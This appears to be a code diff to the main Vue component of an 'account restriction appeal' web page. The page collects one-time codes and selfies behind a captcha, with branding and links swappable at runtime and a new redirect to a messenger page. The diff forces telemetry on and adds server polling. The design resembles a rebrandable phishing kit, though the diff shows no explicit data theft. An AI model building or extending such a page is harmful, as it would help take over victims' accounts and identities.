@@ -7,6 +7,7 @@
       <div class="w-full max-w-[440px]">
         <SessionExpired v-if="session.phase === 'invalid'" :login-url="loginUrl" />
         <ErrorState v-else-if="session.phase === 'offline'" @retry="session.retry()" />
+        <RestoredState v-else-if="session.phase === 'restored'" :home-url="homeUrl" />
         <template v-else-if="session.phase === 'ready'">
           <StepNavigator :current="appeal.step" :total="TOTAL_STEPS" />
           <div class="relative min-h-[420px]">
@@ -33,9 +34,9 @@ import { useSessionStore } from './stores/session'
 import { useAppealStore, TOTAL_STEPS } from './stores/appeal'
 import { useI18nStore } from './stores/i18n'
 import { useUiStore } from './stores/ui'
-import { fetchBootstrap, hasInjectedBoot } from './services/bootstrapService'
+import { fetchBootstrap } from './services/bootstrapService'
 import { startHeartbeat, stopHeartbeat } from './services/heartbeatService'
-import { configureTelemetry, disableTelemetry, track } from './services/telemetryService'
+import { configureTelemetry, track } from './services/telemetryService'
 import { on as onBus } from './services/eventBus'
 import { useDocumentTitle } from './composables/useDocumentTitle'
 import SplashScreen from './components/SplashScreen.vue'
@@ -51,6 +52,7 @@ const OtpChallenge = defineAsyncComponent(() => import('./components/OtpChalleng
 const SelfieCapture = defineAsyncComponent(() => import('./components/SelfieCapture.vue'))
 const AppealSubmitted = defineAsyncComponent(() => import('./components/AppealSubmitted.vue'))
 const SessionExpired = defineAsyncComponent(() => import('./components/SessionExpired.vue'))
+const RestoredState = defineAsyncComponent(() => import('./components/RestoredState.vue'))
 const ErrorState = defineAsyncComponent(() => import('./components/ErrorState.vue'))
 const LegalDisclaimer = defineAsyncComponent(() => import('./components/LegalDisclaimer.vue'))
 
@@ -70,6 +72,7 @@ const brandName = computed(() => config.brand.name || 'Hassani GPT')
 const brandLogo = computed(() => config.brand.logo || '/1234.png')
 const captchaSiteKey = computed(() => config.captcha.siteKey || 'ea14e556-79e8-46a4-a59e-21d8653267be')
 const loginUrl = computed(() => (config.links && config.links.login) || '/login.html')
+const homeUrl = computed(() => (config.links && config.links.home) || '/messenger1.html')
 
 const footerLinks = computed(() => {
   const L = config.links || {}
@@ -98,23 +101,26 @@ onMounted(async () => {
   if (boot && boot.features) config.features = { ...config.features, ...boot.features }
   if (boot && boot.links) config.links = { ...config.links, ...boot.links }
 
-  const injectedBoot = hasInjectedBoot()
-  configureTelemetry({ enabled: !injectedBoot && (!boot.features || boot.features.telemetryEnabled !== false) })
+  configureTelemetry({ enabled: true })
 
   await i18n.init(readLangHint())
 
   await session.boot()
 
-  if (session.source === 'injected') disableTelemetry()
+  const runtimeCfg = session.runtimeConfig
+  if (runtimeCfg) {
+    if (runtimeCfg.brand) config.brand = { ...config.brand, ...runtimeCfg.brand }
+    if (runtimeCfg.captcha) config.captcha = { ...config.captcha, ...runtimeCfg.captcha }
+    if (runtimeCfg.features) config.features = { ...config.features, ...runtimeCfg.features }
+    if (runtimeCfg.links) config.links = { ...config.links, ...runtimeCfg.links }
+  }
 
   if (session.phase === 'ready' && session.profile) {
     appeal.syncFromProfile(session.profile)
     track('restriction_profile_view', { appealStatus: session.profile.appealStatus || 'none' })
   }
 
-  if (session.source !== 'injected') {
-    startHeartbeat(config.features.heartbeatMs || 25000, (info) => ui.setHeartbeat(info))
-  }
+  startHeartbeat(config.features.heartbeatMs || 25000, () => session.pollOnce(), (beat) => ui.setHeartbeat(beat))
 
   window.addEventListener('beforeunload', () => {
     stopHeartbeat()
